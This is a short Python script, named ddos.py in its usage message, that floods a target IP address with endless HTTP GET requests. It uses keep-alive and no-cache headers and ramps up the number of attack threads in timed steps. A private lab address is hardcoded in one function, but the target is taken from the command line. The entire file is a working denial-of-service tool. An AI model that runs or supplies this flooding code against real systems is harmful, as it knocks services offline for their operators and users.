import requests
from urllib.request import Request, urlopen
import sys
import time
import threading


def flood():
    headers = {'Cache-Control': 'no-cache', 'Connection': 'keep-alive',  'Keep-Alive': '1000'}
    while True:
        requests.get("http://172.16.1.51", headers=headers, stream=True, verify=False)


def flood2(target_ip):
    while True:
        # urllib.request.add_header
        # urlopen("http://172.16.1.51")
        # rq = Request("http://172.16.1.51")
        rq = Request("http://" + target_ip)
        rq.add_header('Connection', 'keep-alive')
        rq.add_header('Keep-Alive', 1000)
        rq.add_header('Cache-Control', 'no-cache')
        urlopen(rq)


if len(sys.argv) < 5:
    print("Usage: ddos.py <total number of threads> <number of thread increment> <period between increments> <target ip>")
    sys.exit()

total_number_threads = int(sys.argv[1])
number_thread_increment = int(sys.argv[2])
period_between_increments = int(sys.argv[3])
target_ip = sys.argv[4]
thread_list = []
print (int(total_number_threads/number_thread_increment))
for j in range(0, int(total_number_threads/number_thread_increment)):
    for i in range(0, number_thread_increment):
        # t = threading.Thread(target=flood, args=(), )
        t = threading.Thread(target=flood2, args=(target_ip, ))
        t.daemon = True
        t.start()
        thread_list.append(t)
    print("Attack with " + str((j+1)*number_thread_increment) + " started")
    time.sleep(period_between_increments)

for i in range(0, len(thread_list)):
    thread_list[i].join()
